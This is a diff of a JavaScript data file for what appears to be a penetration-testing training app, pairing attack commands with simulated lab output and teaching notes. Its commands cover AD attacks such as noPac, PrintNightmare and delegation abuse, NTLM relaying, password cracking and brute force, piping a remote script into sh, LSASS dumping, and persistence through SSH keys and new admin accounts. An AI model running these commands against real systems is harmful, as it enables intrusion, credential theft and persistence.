+        '[*] Exploiting CVE-2021-42278 + CVE-2021-42287 (sAMAccountName spoofing)',
+        '[+] Got a TGT impersonating a Domain Admin',
+        '[*] Dumping NTDS...',
+        'krbtgt:502:aad3b...:1a59bd44...:::',
+      ].join('\n'),
+      signal: '[+] Got a TGT impersonating a Domain Admin',
+      teach: 'noPac abuses a sAMAccountName confusion to get a ticket as a DC/administrator from an ordinary user — a near-instant domain takeover on unpatched DCs. Beyond core OSCP scope but common in labs; confirm the DC is unpatched first.',
+    },
+    'printnightmare': {
+      cmd: "CVE-2021-1675.py acme.internal/jbloggs:'Autumn2026!'@10.10.10.10 '\\\\10.10.14.5\\share\\evil.dll'", tool: 'CVE-2021-1675.py',
+      output: [
+        '[*] Connecting to the Print Spooler service (MS-RPRN)',
+        '[*] Triggering AddPrinterDriverEx to load the remote driver',
+        '[+] Driver loaded; payload executed as SYSTEM',
+      ].join('\n'),
+      signal: '[+] Driver loaded; payload executed as SYSTEM',
+      teach: 'PrintNightmare (CVE-2021-34527) abuses the Print Spooler to load a driver as SYSTEM — local privesc, or remote with creds. Check whether the Spooler service is even running first; if it is disabled, this path is closed.',
+    },
+    'ms14-068': {
+      cmd: "impacket-goldenPac -dc-ip 10.10.10.10 acme.internal/jbloggs:'Autumn2026!'@dc01.acme.internal", tool: 'impacket-goldenPac',
+      output: [
+        '[*] Requesting a TGT with a forged PAC (admin SID)',
+        '[+] Authenticated as Domain Admin',
+        'C:\\Windows\\system32>',
+      ].join('\n'),
+      signal: '[+] Authenticated as Domain Admin',
+      teach: 'MS14-068 forges the PAC inside a Kerberos ticket so an ordinary user claims Domain Admin membership. It only works on DCs missing the 2014 patch — rare today, but a clean, memorable example of how PAC validation can fail.',
+    },
+    'delegation-abuse': {
+      cmd: 'impacket-addcomputer acme.internal/jbloggs:Autumn2026! -dc-ip 10.10.10.10 -computer-name OBOL$ -computer-pass MachinePass123!', tool: 'impacket-addcomputer',
+      output: [
+        '[*] Successfully added machine account OBOL$ with password MachinePass123!',
+        '[*] MachineAccountQuota (default 10) allowed the creation',
+      ].join('\n'),
+      signal: '[*] Successfully added machine account OBOL$ with password MachinePass123!',
+      teach: 'By default any domain user can add up to 10 computer accounts (MachineAccountQuota). A machine account you control is the starting piece for RBCD and S4U delegation attacks — create it, then configure delegation to impersonate an admin.',
+    },
+    'getst-impersonation': {
+      cmd: "impacket-getST -spn cifs/file01.acme.internal -impersonate administrator 'acme.internal/OBOL$:MachinePass123!'", tool: 'impacket-getST',
+      output: [
+        '[*] Impersonating administrator',
+        '[*] Requesting S4U2self',
+        '[*] Requesting S4U2proxy',
+        '[+] Saving ticket in administrator@cifs_file01.ccache',
+      ].join('\n'),
+      signal: '[+] Saving ticket in administrator@cifs_file01.ccache',
+      teach: 'With delegation rights you ask the KDC for a service ticket "on behalf of" any user — S4U2self then S4U2proxy — and get a ccache that lets you act as Administrator against that service. Load the ticket (KRB5CCNAME) and you are in.',
     },
 
-    // ==================== DATABASES ====================
+    // ============================ CREDENTIALS & CRACKING ============================
+    'responder-poison': {
+      cmd: 'sudo responder -I eth0 -w', tool: 'responder',
+      output: [
+        '[*] [LLMNR]  Poisoned answer sent to 10.10.10.50 for name fileshare',
+        '[SMB] NTLMv2-SSP Client   : 10.10.10.50',
+        '[SMB] NTLMv2-SSP Username : ACME\\jdoe',
+        '[SMB] NTLMv2-SSP Hash     : jdoe::ACME:1122334455667788:A1B2...:0101...',
+      ].join('\n'),
+      signal: '[SMB] NTLMv2-SSP Username : ACME\\jdoe',
+      teach: 'When a Windows host mistypes a share name, it broadcasts asking "who is fileshare?". Responder answers "me", and the victim sends its NetNTLMv2 hash. You now have a hash to crack or relay — no exploit, just a protocol default.',
+    },
+    'ntlm-relay-attack': {
+      cmd: 'impacket-ntlmrelayx -tf relay-targets.txt -smb2support', tool: 'impacket-ntlmrelayx',
+      output: [
+        '[*] Servers started, waiting for connections',
+        '[*] Authenticating against smb://10.10.10.20 as ACME/JDOE SUCCEED',
+        '[*] Dumping local SAM hashes',
+        'Administrator:500:aad3b...:31d6cfe0d16ae931b73c59d7e0c089c0:::',
+      ].join('\n'),
+      signal: '[*] Authenticating against smb://10.10.10.20 as ACME/JDOE SUCCEED',
+      teach: 'Relaying forwards a captured authentication to another host instead of cracking it — if SMB signing is off, the victim\'s auth logs you into a second machine as them. "SUCCEED" means you are in without ever knowing the password.',
+    },
+    'mitm6-ipv6-takeover': {
+      cmd: 'sudo mitm6 -i eth0 -d acme.internal', tool: 'mitm6',
+      output: [
+        '[*] IPv6 address assigned to victim 10.10.10.50 via rogue DHCPv6',
+        '[*] Victim queried WPAD — serving malicious proxy config',
+        '[*] Got credentials relayed to LDAP: ACME\\jdoe',
+      ].join('\n'),
+      signal: '[*] Got credentials relayed to LDAP: ACME\\jdoe',
+      teach: 'Windows prefers IPv6 and asks for a DHCPv6 server even when none is configured. mitm6 answers, becomes the victim\'s DNS, and (with ntlmrelayx) relays the auth it captures. A default-on protocol you did not know was running becomes the way in.',
+    },
+    'crack-identify': {
+      cmd: 'nth -f hashes.txt', tool: 'name-that-hash',
+      output: [
+        '$krb5tgs$23$...',
+        'Most Likely:',
+        '  Kerberos 5 TGS-REP etype 23, HC: 13100  JtR: krb5tgs',
+      ].join('\n'),
+      signal: '  Kerberos 5 TGS-REP etype 23, HC: 13100  JtR: krb5tgs',
+      teach: 'Before you can crack a hash you must know what it is. name-that-hash reads the format and tells you the hashcat mode (13100). Guess the mode wrong and hashcat wastes hours on the wrong algorithm — identify first, always.',
+    },
+    'crack-kerberoast': {
+      cmd: 'hashcat -m 13100 tgs.hash /usr/share/wordlists/rockyou.txt', tool: 'hashcat',
+      output: [
+        '$krb5tgs$23$*svc_sql$ACME.INTERNAL$...:3f2a...:Summer2024!',
+        'Status...........: Cracked',
+      ].join('\n'),
+      signal: 'Status...........: Cracked',
+      teach: 'A Kerberoast ticket (mode 13100) is encrypted with the service account\'s password hash, so you crack it offline at full speed with no lockout. "Cracked" means you now hold that account\'s cleartext password.',
+    },
+    'crack-asrep-offline': {
+      cmd: 'hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt', tool: 'hashcat',
+      output: [
+        '$krb5asrep$23$jdoe@ACME.INTERNAL:a1b2...:Welcome2024!',
+        'Status...........: Cracked',
+      ].join('\n'),
+      signal: 'Status...........: Cracked',
+      teach: 'An AS-REP hash (mode 18200) comes from an account with pre-auth disabled, and it cracks offline at full speed. "Cracked" turns the roast into a login — a real domain credential.',
+    },
+    'crack-ntlm': {
+      cmd: 'hashcat -m 1000 ntlm.hash /usr/share/wordlists/rockyou.txt', tool: 'hashcat',
+      output: [
+        '31d6cfe0d16ae931b73c59d7e0c089c0:(empty)',
+        '7c6a180b36896a0a8c02787eeafb0e4c:password1',
+        'Status...........: Cracked',
+      ].join('\n'),
+      signal: '7c6a180b36896a0a8c02787eeafb0e4c:password1',
+      teach: 'A dumped NTLM hash (mode 1000) cracks offline. You do not always need to — NTLM can be passed directly — but a recovered cleartext password is reusable on services that will not take a hash (RDP, web, SSH).',
+    },
+    'crack-netntlmv2': {
+      cmd: 'hashcat -m 5600 netntlmv2.hash /usr/share/wordlists/rockyou.txt', tool: 'hashcat',
+      output: [
+        'JDOE::ACME:1122334455667788:A1B2...:Winter2024!',
+        'Status...........: Cracked',
+      ].join('\n'),
+      signal: 'JDOE::ACME:1122334455667788:A1B2...:Winter2024!',
+      teach: 'The NetNTLMv2 hash Responder captured cracks offline in hashcat mode 5600. A NetNTLMv2 hash CANNOT be passed — only cracked or relayed — so recover the password and it becomes a real login wherever that account is valid.',
+    },
+    'crack-shadow': {
+      cmd: 'hashcat -m 1800 shadow.hash /usr/share/wordlists/rockyou.txt', tool: 'hashcat',
+      output: [
+        'root:$6$xyz$...:toor123',
+        'Status...........: Cracked',
+      ].join('\n'),
+      signal: 'root:$6$xyz$...:toor123',
+      teach: 'A $6$ hash from /etc/shadow is sha512crypt (mode 1800) — slow by design, so lean on a good wordlist and rules. Crack root\'s hash and the privesc is done; crack a service user and you may unlock lateral moves.',
+    },
+    'crack-archive': {
+      cmd: 'zip2john backup.zip > archive.hash && hashcat -m 17200 archive.hash rockyou.txt', tool: 'zip2john',
+      output: [
+        'backup.zip/config.bak:$pkzip2$...:hunter2',
+        'Status...........: Cracked',
+      ].join('\n'),
+      signal: 'backup.zip/config.bak:$pkzip2$...:hunter2',
+      teach: 'A password-protected archive you looted is just another crackable hash — zip2john/office2john extract it, hashcat breaks it. The contents are often the reason it was protected: credentials, keys, or the next foothold.',
+    },
+    'online-brute-ssh': {
+      cmd: 'hydra -L users.txt -P /usr/share/wordlists/rockyou.txt -f -t 4 ssh://10.10.10.10', tool: 'hydra',
+      output: [
+        '[DATA] attacking ssh://10.10.10.10:22/',
+        '[22][ssh] host: 10.10.10.10   login: bmurphy   password: iloveyou',
+        '1 of 1 target successfully completed, 1 valid password found',
+      ].join('\n'),
+      signal: '[22][ssh] host: 10.10.10.10   login: bmurphy   password: iloveyou',
+      teach: 'When you have a real username but no password, a measured online brute against SSH can find a weak one. Keep the wordlist small and the rate sane (-t 4) — lab accounts lock out too, and a found pair is an instant shell.',
+    },
+    'online-brute-ftp': {
+      cmd: 'hydra -L users.txt -P /usr/share/wordlists/rockyou.txt -f ftp://10.10.10.10', tool: 'hydra',
+      output: [
+        '[DATA] attacking ftp://10.10.10.10:21/',
+        '[21][ftp] host: 10.10.10.10   login: bob   password: ftp123',
+      ].join('\n'),
+      signal: '[21][ftp] host: 10.10.10.10   login: bob   password: ftp123',
+      teach: 'Against a confirmed FTP service with a known user, a measured hydra run finds weak passwords — and always test anonymous first, it is free. A hit gives you file access, and often the files hold the next credential.',
+    },
+    'online-brute-rdp': {
+      cmd: 'hydra -L users.txt -P /usr/share/wordlists/rockyou.txt -f -t 1 rdp://10.10.10.10', tool: 'hydra',
+      output: [
+        '[DATA] attacking rdp://10.10.10.10:3389/',
+        '[3389][rdp] host: 10.10.10.10   login: admin   password: Password1',
+      ].join('\n'),
+      signal: '[3389][rdp] host: 10.10.10.10   login: admin   password: Password1',
+      teach: 'A weak RDP password is an interactive desktop. Brute it only with a real username and a short list at -t 1 — RDP lockout policies are unforgiving. A hit here is a full GUI session as that user.',
+    },
+    'crack-mscache2': {
+      cmd: 'hashcat -m 2100 dcc2.hash /usr/share/wordlists/rockyou.txt', tool: 'hashcat',
+      output: [
+        '$DCC2$10240#jdoe#a1b2c3...:Autumn2023!',
+        'Status...........: Cracked',
+      ].join('\n'),
+      signal: '$DCC2$10240#jdoe#a1b2c3...:Autumn2023!',
+      teach: 'Domain Cached Credentials (mscash2, mode 2100) are what a laptop stores so a domain user can log in offline. They crack slowly and cannot be passed — only cracked — but a recovered password is a real domain credential.',
+    },
+
+    // ============================ LINUX PRIVESC ============================
+    'linux-enum': {
+      cmd: 'curl -sL http://10.10.14.5:8000/linpeas.sh | sh', tool: 'linpeas',
+      output: [
+        '[+] Sudo version 1.8.31',
+        '[+] Checking sudo -l',
+        '    (ALL) NOPASSWD: /usr/bin/find',
+        '[95m[+] SUID - Check easy privesc[0m',
+        '    /usr/bin/pkexec',
+      ].join('\n'),
+      signal: '    (ALL) NOPASSWD: /usr/bin/find',
+      teach: 'linpeas runs every local privesc check at once and colour-codes the leads. A NOPASSWD sudo entry on a GTFOBins binary like find is a bright-green, near-certain path to root. Enumerate first; it points you at the real vector.',
+    },
+    'sudo-abuse': {
+      cmd: 'sudo -l', tool: 'sh',
+      output: [
+        'Matching Defaults entries for www-data on target:',
+        '    env_reset, mail_badpass',
+        'User www-data may run the following commands on target:',
+        '    (ALL) NOPASSWD: /usr/bin/find',
+      ].join('\n'),
+      signal: '    (ALL) NOPASSWD: /usr/bin/find',
+      teach: 'sudo -l lists what you may run as another user without a password. NOPASSWD on a GTFOBins binary like find is a direct road to root (find . -exec /bin/sh \\; ). It is the first command to run on any Linux foothold.',
+    },
+    'writable-passwd': {
+      cmd: 'ls -la /etc/passwd', tool: 'sh',
+      output: [
+        '-rw-rw-rw- 1 root root 2841 Jan  1 10:00 /etc/passwd',
+      ].join('\n'),
+      signal: '-rw-rw-rw- 1 root root 2841 Jan  1 10:00 /etc/passwd',
+      teach: 'A world-writable /etc/passwd lets you add a root-UID user with a password hash you control (openssl passwd), then su to it. A single misconfigured permission bit is a direct path to root.',
+    },
+    'nfs-squash': {
+      cmd: 'showmount -e 10.10.10.10', tool: 'showmount',
+      output: [
+        'Export list for 10.10.10.10:',
+        '/srv/share  *(rw,no_root_squash)',
+      ].join('\n'),
+      signal: '/srv/share  *(rw,no_root_squash)',
+      teach: 'no_root_squash on an NFS export means files you create as root on your own machine stay root-owned on the target. Mount it, drop a root-owned SUID shell, and run it on the box — a classic NFS privesc. Check the export options first.',
+    },
+    'lxc-lxd-escape': {
+      cmd: 'id', tool: 'sh',
+      output: [
+        'uid=1000(dev) gid=1000(dev) groups=1000(dev),110(lxd)',
+      ].join('\n'),
+      signal: 'uid=1000(dev) gid=1000(dev) groups=1000(dev),110(lxd)',
+      teach: 'Membership in the lxd group is root-equivalent: you launch a privileged container that mounts the host filesystem and read or write anything as root. Like the docker group, lxd is a privilege nobody thinks of as one — always check your groups.',
+    },
+    'docker-socket': {
+      cmd: 'ls -la /var/run/docker.sock && id', tool: 'sh',
+      output: [
+        'srw-rw---- 1 root docker 0 Jan 1 10:00 /var/run/docker.sock',
+        'uid=1000(dev) gid=1000(dev) groups=1000(dev),998(docker)',
+      ].join('\n'),
+      signal: 'uid=1000(dev) gid=1000(dev) groups=1000(dev),998(docker)',
+      teach: 'Membership in the docker group is root-equivalent: you can start a container that mounts the host\'s / and read or write anything as root. The docker socket being reachable is the whole game.',
+    },
+    'suid-gtfobins': {
+      cmd: 'find / -perm -4000 -type f 2>/dev/null', tool: 'sh',
+      output: [
+        '/usr/bin/passwd',
+        '/usr/bin/sudo',
+        '/usr/bin/find',
+      ].join('\n'),
+      signal: '/usr/bin/find',
+      teach: 'A SUID binary runs as its owner (often root) no matter who starts it. Cross the list against GTFOBins — /usr/bin/find with the SUID bit is a one-liner to a root shell. Ignore the expected ones (passwd, sudo); hunt the unusual.',
+    },
+    'pspy-monitor': {
+      cmd: './pspy64 -pf -i 1000', tool: 'pspy',
+      output: [
+        '2026/09/17 10:41:01 CMD: UID=0  PID=4120  /bin/bash /opt/backup.sh',
+        '2026/09/17 10:43:01 CMD: UID=0  PID=4221  /bin/bash /opt/backup.sh',
+      ].join('\n'),
+      signal: '2026/09/17 10:41:01 CMD: UID=0  PID=4120  /bin/bash /opt/backup.sh',
+      teach: 'pspy watches the process table without root, so it catches cron jobs and scheduled tasks you cannot see in crontab. A root job (UID=0) running every 2 minutes is a privesc lead — if you can write the script it runs, you run code as root.',
+    },
+    'cron-abuse': {
+      cmd: 'cat /etc/crontab', tool: 'sh',
+      output: [
+        'SHELL=/bin/sh',
+        '*/2 *   * * *   root    /opt/backup.sh',
+        '# and /opt/backup.sh is world-writable',
+      ].join('\n'),
+      signal: '*/2 *   * * *   root    /opt/backup.sh',
+      teach: 'A cron job that runs as root on a script you can write is a direct privesc: append a reverse shell or a SUID copy of bash, wait for the next run, and you are root. Check /etc/crontab, /etc/cron.*, and tar-wildcard jobs.',
+    },
+    'capabilities': {
+      cmd: 'getcap -r / 2>/dev/null', tool: 'sh',
+      output: [
+        '/usr/bin/python3.8 = cap_setuid+ep',
+        '/usr/bin/ping = cap_net_raw+ep',
+      ].join('\n'),
+      signal: '/usr/bin/python3.8 = cap_setuid+ep',
+      teach: 'File capabilities grant slices of root power without the SUID bit. cap_setuid+ep on python means it can set its UID to 0 — one line (os.setuid(0)) and you are root. Always run getcap -r / on a Linux box.',
+    },
+    'linux-loot-hunt': {
+      cmd: 'grep -rils "password" /var/www /home 2>/dev/null', tool: 'sh',
+      output: [
+        '/var/www/html/config.php: $db_pass = "w3b4ppp4ss";',
+        '/home/dev/.bash_history: mysql -u root -pSuperSecret123',
+      ].join('\n'),
+      signal: '/var/www/html/config.php: $db_pass = "w3b4ppp4ss";',
+      teach: 'Once you have a shell, loot before you escalate. Config files, shell history, and web roots leak passwords constantly — and people reuse them, so a web app\'s DB password is often root\'s too. Grep widely for password, secret, and key.',
+    },
+    'linux-persistence': {
+      signal: 'root@target:~#',
+      teach: 'Labs revert and shells die. Adding your public key to authorized_keys gives you a stable, password-free way back in — far better than re-exploiting each time. On a real engagement, persistence is scoped and documented.',
+      steps: [
+        { where: 'host', tool: 'sh', cmd: "mkdir -p /root/.ssh && echo 'ssh-ed25519 AAAA...you@kali' >> /root/.ssh/authorized_keys", output: [
+          '# your public key is now appended to root\'s authorized_keys (no output on success)',
+        ].join('\n') },
+        { where: 'local', tool: 'ssh', cmd: 'ssh -i id_ed25519 root@10.10.10.10', output: [
+          'Last login: Mon Jan  1 10:00:00 2024 from 10.10.14.5',
+          'root@target:~#',
+        ].join('\n') },
+      ],
+    },
+
+    // ============================ WINDOWS PRIVESC ============================
+    'windows-enum': {
+      cmd: 'whoami /priv', tool: 'sh',
+      output: [
+        'PRIVILEGES INFORMATION',
+        '----------------------',
+        'Privilege Name                Description                    State',
+        'SeImpersonatePrivilege        Impersonate a client           Enabled',
+        'SeChangeNotifyPrivilege       Bypass traverse checking       Enabled',
+      ].join('\n'),
+      signal: 'SeImpersonatePrivilege        Impersonate a client           Enabled',
+      teach: 'whoami /priv lists your privileges — the fastest Windows privesc check. SeImpersonatePrivilege Enabled on a service account means a "potato" exploit gets you SYSTEM. Follow with systeminfo and winPEAS for the full picture.',
+    },
+    'seimpersonate': {
+      cmd: 'whoami /priv | findstr /i impersonate', tool: 'sh',
+      output: [
+        'SeImpersonatePrivilege        Impersonate a client after authentication  Enabled',
+      ].join('\n'),
+      signal: 'SeImpersonatePrivilege        Impersonate a client after authentication  Enabled',
+      teach: 'SeImpersonate lets a process impersonate a client that connects to it. The "potato" family (GodPotato, PrintSpoofer) tricks a SYSTEM service into connecting, then steals its token — a reliable service-account-to-SYSTEM jump.',
+    },
+    'unquoted-service-path': {
+      cmd: 'wmic service get name,pathname,startmode | findstr /i auto | findstr /i /v "c:\\windows\\\\"', tool: 'sh',
+      output: [
+        'VulnSvc    C:\\Program Files\\Acme Agent\\service.exe    Auto',
+      ].join('\n'),
+      signal: 'VulnSvc    C:\\Program Files\\Acme Agent\\service.exe    Auto',
+      teach: 'An unquoted service path with spaces lets Windows try C:\\Program.exe, then C:\\Program Files\\Acme.exe, before the real binary. If you can write to one of those directories, drop your payload there and the service runs it — often as SYSTEM.',
+    },
+    'weak-service-permissions': {
+      cmd: 'accesschk.exe -uwcqv someuser VulnSvc /accepteula', tool: 'accesschk',
+      output: [
+        'VulnSvc',
+        '  RW someuser',
+        '        SERVICE_ALL_ACCESS',
+      ].join('\n'),
+      signal: '        SERVICE_ALL_ACCESS',
+      teach: 'SERVICE_ALL_ACCESS over a service means you can rewrite its binary path (sc config VulnSvc binpath= ...) to run any command, then restart it — code execution as the service account, usually SYSTEM. accesschk finds these loose ACLs.',
+    },
+    'alwaysinstallelevated': {
+      cmd: 'reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated', tool: 'sh',
+      output: [
+        'HKLM\\...\\Installer',
+        '    AlwaysInstallElevated    REG_DWORD    0x1',
+        '# HKCU is also 0x1',
+      ].join('\n'),
+      signal: '    AlwaysInstallElevated    REG_DWORD    0x1',
+      teach: 'When AlwaysInstallElevated is 0x1 in BOTH HKLM and HKCU, any MSI you install runs as SYSTEM. Build a malicious MSI (msfvenom -f msi), run msiexec, and you escalate — a pure misconfiguration, no exploit needed.',
+    },
+    'dpapi-secrets': {
+      cmd: "impacket-dpapi credential -file C:\\Users\\dev\\AppData\\...\\Credentials\\A1B2 -key 0x...", tool: 'impacket-dpapi',
+      output: [
+        '[CREDENTIAL]',
+        'Target: LegacyGeneric:target=git',
+        'Username: svc_build',
+        'Unknown3: Bu1ld!2023',
+      ].join('\n'),
+      signal: 'Unknown3: Bu1ld!2023',
+      teach: 'Windows DPAPI encrypts saved browser and app passwords with a key derived from the user\'s login. With that user\'s context (or their masterkey) you decrypt the blobs and recover cleartext credentials — often for other systems the user accessed.',
+    },
+    'stored-credentials': {
+      cmd: 'cmdkey /list', tool: 'sh',
+      output: [
+        'Currently stored credentials:',
+        '    Target: Domain:interactive=ACME\\administrator',
+        '    Type: Domain Password',
+      ].join('\n'),
+      signal: '    Target: Domain:interactive=ACME\\administrator',
+      teach: 'Windows caches credentials for convenience. cmdkey /list shows stored logins you can reuse with runas /savecred — sometimes an Administrator credential is sitting there for the taking, no cracking needed.',
+    },
+    'windows-old-hives': {
+      cmd: 'dir C:\\Windows.old\\Windows\\System32\\config', tool: 'sh',
+      output: [
+        'Directory of C:\\Windows.old\\Windows\\System32\\config',
+        '01/08/2024  09:12            65,536 SAM',
+        '01/08/2024  09:12         9,437,184 SYSTEM',
+      ].join('\n'),
+      signal: '01/08/2024  09:12            65,536 SAM',
+      teach: 'A Windows.old folder from an in-place upgrade keeps old registry hives — SAM and SYSTEM — that a low-priv user can often read. Pull them and dump offline (secretsdump) for the local Administrator hash, then pass it.',
+    },
+    'wesng-patch-gaps': {
+      cmd: 'systeminfo', tool: 'sh',
+      output: [
+        'OS Name:          Microsoft Windows Server 2016 Standard',
+        'OS Version:       10.0.14393 N/A Build 14393',
+        'Hotfix(s):        3 Hotfix(s) Installed.',
+      ].join('\n'),
+      signal: 'OS Version:       10.0.14393 N/A Build 14393',
+      teach: 'systeminfo gives the exact build and installed hotfixes. Feed it to wesng (Windows Exploit Suggester) and it lists the kernel exploits the box is missing. Confirm the build and architecture before running one — a wrong kernel exploit bluescreens the target.',
+    },
+    'windows-persistence': {
+      cmd: "net user obol_svc 'Str0ng!Passw0rd' /add && net localgroup administrators obol_svc /add", tool: 'sh',
+      output: [
+        'The command completed successfully.',
+        'The command completed successfully.',
+      ].join('\n'),
+      signal: 'The command completed successfully.',
+      teach: 'A local admin account you add is a durable way back onto a Windows box after a revert or reboot. On a real engagement this is scoped, logged, and cleaned up afterward; note what you create so you can remove it.',
+    },
+    'lsass-dump-onbox': {
+      cmd: 'rundll32 C:\\windows\\system32\\comsvcs.dll, MiniDump 672 C:\\Windows\\Temp\\lsass.dmp full', tool: 'cmd',
+      output: [
+        '# dump written; parse offline with pypykatz:',
+        'Username: administrator   NT: 2b576acbe6b...',
+      ].join('\n'),
+      signal: 'Username: administrator   NT: 2b576acbe6b...',
+      teach: 'LSASS holds the credentials of everyone logged in. With local admin you dump its memory and parse it offline (pypykatz) for NTLM hashes — including, on a shared box, domain admins. Those hashes feed pass-the-hash and lateral movement.',
+    },
+    'defense-enum': {
+      cmd: 'powershell -c "$ExecutionContext.SessionState.LanguageMode"', tool: 'powershell',
+      output: [
+        'ConstrainedLanguage',
+      ].join('\n'),
+      signal: 'ConstrainedLanguage',
+      teach: 'Before you throw tooling at a Windows box, learn what is watching: Constrained Language Mode, AppLocker, and real-time protection all change what will run. Knowing the constraints up front saves you from burning a shell on something that was never going to execute.',
+    },
+
+    // ============================ DATABASES ============================
     'mysql-login': {
+      cmd: "mysql -h 10.10.10.10 -u root -p'toor' -e 'SELECT version();'", tool: 'mysql',
       output: [
         '+-------------------------+',
         '| version()               |',
@@ -702,569 +1432,66 @@
         '+-------------------------+',
       ].join('\n'),
       signal: '| 5.7.33-0ubuntu0.16.04.1 |',
-      teach: 'A successful MySQL login is a foothold of its own: from the SQL prompt you can read application secrets, write files to the web root with INTO OUTFILE, and sometimes reach the OS. Confirm the version first — it steers what is possible.',
+      teach: 'A successful MySQL login is a foothold of its own: from SQL you can read application secrets, write files to the web root with INTO OUTFILE, and sometimes reach the OS. Confirm the version first — it steers what is possible.',
+    },
+    'mysql-loot': {
+      cmd: "mysql -h 10.10.10.10 -u root -p'toor' -e 'SELECT user,host,authentication_string FROM mysql.user;'", tool: 'mysql',
+      output: [
+        '+------------------+------+-------------------------------------------+',
+        '| user             | host | authentication_string                     |',
+        '+------------------+------+-------------------------------------------+',
+        '| root             | %    | *81F5E21E35407D884A6CD4A731AEBFB6AF209E1B |',
+        '| webapp           | %    | *2470C0C06DEE42FD1618BB99005ADCA2EC9D1E19 |',
+        '+------------------+------+-------------------------------------------+',
+      ].join('\n'),
+      signal: '| root             | %    | *81F5E21E35407D884A6CD4A731AEBFB6AF209E1B |',
+      teach: 'Once you have a DB session, the mysql.user table holds every account\'s password hash (mode 300 for the *HEX form). Dump them and crack offline — database passwords are reused as system and domain passwords all the time.',
+    },
+    'mssql-login': {
+      cmd: 'mssqlclient.py acme.internal/svc_sql:P@ssw0rd2023@10.10.10.10 -windows-auth', tool: 'mssqlclient.py',
+      output: [
+        '[*] Encryption required, switching to TLS',
+        '[*] ACME\\svc_sql  guest@master',
+        "SQL> SELECT IS_SRVROLEMEMBER('sysadmin') AS is_sysadmin;",
+        'is_sysadmin : 1',
+      ].join('\n'),
+      signal: 'is_sysadmin : 1',
+      teach: 'The first thing to check on an MSSQL login is IS_SRVROLEMEMBER(\'sysadmin\'). A 1 means you can re-enable xp_cmdshell and run OS commands, or impersonate other logins. Sysadmin on MSSQL is effectively a shell on the host.',
     },
     'mssql-xp-cmdshell': {
+      cmd: "mssqlclient.py ...@10.10.10.10 -q \"EXEC xp_cmdshell 'whoami'\"", tool: 'mssqlclient.py',
       output: [
-        'SQL> EXEC xp_cmdshell \'whoami\'',
         'output',
         '--------------------------------',
         'nt service\\mssqlserver',
       ].join('\n'),
       signal: 'nt service\\mssqlserver',
-      teach: 'With sysadmin on MSSQL you can re-enable `xp_cmdshell` and run OS commands as the SQL service account. The `whoami` output confirms code execution — the database just became a shell.',
+      teach: 'With sysadmin on MSSQL you re-enable xp_cmdshell and run OS commands as the SQL service account. The whoami output confirms code execution — the database just became a shell. From here, grab a reverse shell.',
     },
     'postgres-login': {
+      cmd: "PGPASSWORD=postgres psql -h 10.10.10.10 -U postgres -c 'SELECT version();'", tool: 'psql',
       output: [
-        ' version',
-        '--------------------------------------------',
-        ' PostgreSQL 13.3 on x86_64-pc-linux-gnu',
+        '                         version',
+        '--------------------------------------------------------------',
+        ' PostgreSQL 13.3 on x86_64-pc-linux-gnu, compiled by gcc 10.2',
         '(1 row)',
       ].join('\n'),
-      signal: ' PostgreSQL 13.3 on x86_64-pc-linux-gnu',
+      signal: ' PostgreSQL 13.3 on x86_64-pc-linux-gnu, compiled by gcc 10.2',
       teach: 'A PostgreSQL session with the right role can read files and, via COPY ... FROM PROGRAM, run commands. As with any DB foothold, the version tells you which of those paths is open to you.',
     },
-
-    // ==================== SHELLS & TRANSFER ====================
-    'shell-revshell-linux': {
+    'redis-enum': {
+      cmd: 'redis-cli -h 10.10.10.10 INFO server', tool: 'redis-cli',
       output: [
-        'listening on [any] 4444 ...',
-        'connect to [10.10.14.5] from (UNKNOWN) [10.10.10.10] 54312',
-        'bash: cannot set terminal process group: Inappropriate ioctl for device',
-        'www-data@target:/var/www/html$ id',
-        'uid=33(www-data) gid=33(www-data)',
+        '# Server',
+        'redis_version:6.0.16',
+        'os:Linux 5.15.0-79-generic x86_64',
+        'config_file:/etc/redis/redis.conf',
       ].join('\n'),
-      signal: 'connect to [10.10.14.5] from (UNKNOWN) [10.10.10.10] 54312',
-      teach: 'The "connect to … from" line is your listener catching the target calling back — the moment code execution becomes an interactive shell. Note the raw prompt; it is not a proper TTY yet, which is why the next move is to upgrade it.',
-    },
-    'shell-pty-upgrade': {
-      output: [
-        'www-data@target:/$ python3 -c \'import pty;pty.spawn("/bin/bash")\'',
-        'www-data@target:/$ ^Z',
-        '[1]+  Stopped',
-        '$ stty raw -echo; fg',
-        'www-data@target:/$',
-      ].join('\n'),
-      signal: '$ stty raw -echo; fg',
-      teach: 'A raw netcat shell has no job control, no arrows, no tab-complete, and dies on Ctrl-C. Spawning a PTY and fixing the terminal with `stty raw -echo` gives you a real shell — do it before you try anything that needs interaction, like `su` or `ssh`.',
-    },
-
-    // ==================== LINUX PRIVESC ====================
-    'capabilities': {
-      output: [
-        '/usr/bin/python3.8 = cap_setuid+ep',
-        '/usr/bin/ping = cap_net_raw+ep',
-      ].join('\n'),
-      signal: '/usr/bin/python3.8 = cap_setuid+ep',
-      teach: 'File capabilities grant slices of root power without the SUID bit. `cap_setuid+ep` on python means python can set its UID to 0 — one line (`os.setuid(0)`) and you are root. Always run `getcap -r /` on a Linux box.',
-    },
-    'docker-socket': {
-      output: [
-        'srw-rw---- 1 root docker 0 Jan  1 10:00 /var/run/docker.sock',
-        'uid=1000(dev) gid=1000(dev) groups=1000(dev),998(docker)',
-      ].join('\n'),
-      signal: 'groups=1000(dev),998(docker)',
-      teach: 'Membership in the `docker` group is root-equivalent: you can start a container that mounts the host\'s `/` and read or write anything as root. The docker socket being reachable is the whole game.',
-    },
-    'writable-passwd': {
-      output: [
-        '-rw-rw-rw- 1 root root 2841 Jan  1 10:00 /etc/passwd',
-      ].join('\n'),
-      signal: '-rw-rw-rw- 1 root root 2841 Jan  1 10:00 /etc/passwd',
-      teach: 'A world-writable `/etc/passwd` lets you add a root-UID user with a password hash you control (openssl passwd), then `su` to it. A single misconfigured permission bit is a direct path to root.',
-    },
-
-    // ==================== WINDOWS PRIVESC ====================
-    'stored-credentials': {
-      output: [
-        'Currently stored credentials:',
-        '    Target: Domain:interactive=CORP\\administrator',
-        '    Type: Domain Password',
-      ].join('\n'),
-      signal: '    Target: Domain:interactive=CORP\\administrator',
-      teach: 'Windows caches credentials for convenience. `cmdkey /list` shows stored logins you can reuse with `runas /savecred` — sometimes an Administrator credential is sitting there for the taking, no cracking needed.',
-    },
-    'wesng-patch-gaps': {
-      output: [
-        '[+] OS: Windows Server 2016 1607 (10.0.14393)',
